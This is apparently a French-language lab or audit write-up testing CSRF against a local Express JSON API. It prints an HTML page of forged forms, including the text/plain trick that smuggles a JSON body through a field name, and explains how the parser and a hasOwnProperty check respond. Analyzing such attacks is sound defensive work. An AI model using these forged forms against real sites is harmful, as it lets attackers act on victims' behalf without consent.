## CSRF

Les attaques CSRF sont problématiques dans ce cas, car aucune protection n'est présente (token, CORS).
Cependant l'application utilise une API qui n'accepte que du JSON.
Cela complique largement le problème, car il est déjà impossible sur un navigateur moderne d'appeler de manière asynchrone une route qui ne définit pas de CORS.

La seule possibilité est l'attaque par un formulaire classique qui lui redirige le client sur l'API.

### Formulaire d'exemple

```html
<html>
    <body>
        <form method="POST" action="http://localhost:3000/message" enctype="application/json">
            <input type="number" name='to' value='1'/>
            <input type="text" name='subject' value="CRSF PWNED" />
            <input type="text" name='message' value='HAHAH' />
            <input type="submit" />
        </form>
        <form method="POST" action="http://localhost:3000/message">
            <input type="number" name='to' value='1' />
            <input type="text" name='subject' value="CRSF PWNED" />
            <input type="text" name='message' value='HAHAH' />
            <input type="submit" />
        </form>
        <form method="POST" action="http://localhost:3000/message" enctype="text/plain">
            <input type="text" name='{"to":1,"subject":"CRSF PWNED", "message":"' value='HAHAH"}' />
            <input type="submit" />
        </form>
        <form method="POST" action="http://localhost:3000/message" enctype="application/json">
            <input type="text" name='{"to":1,"subject":"CRSF PWNED", "message":"' value='HAHAH"}' />
            <input type="submit" />
        </form>
    </body>
</html>
```

### Mitigation

Dans ce cas, expressjs semble sauvé la situation, car il est très strict sur la forme des données ce qui bloque ces états.

Par contre, dans le cas du premier formulaire qui n'est pas standard, mais qui fournit un JSON valide dans le cas de chrome (79.0.3945.79).
L'erreur qui survient est une mauvaise construction du parser d’expressjs qui fourni un objet null donc le prototype contient les champs envoyés.
Cela ne semble pas avoir d'impact, car impossible de créer du code exécutable, mais la seule barrière reste ces tests de validations :

```javascript
if (!req.body.hasOwnProperty('to') || !req.body.hasOwnProperty('subject') || !req.body.hasOwnProperty('message')) {
    res.sendStatus(400);
    return;
}
```

Dans ce cas, la fonction `hasOwnProperty` n'existe pas et crée une erreur `500`.
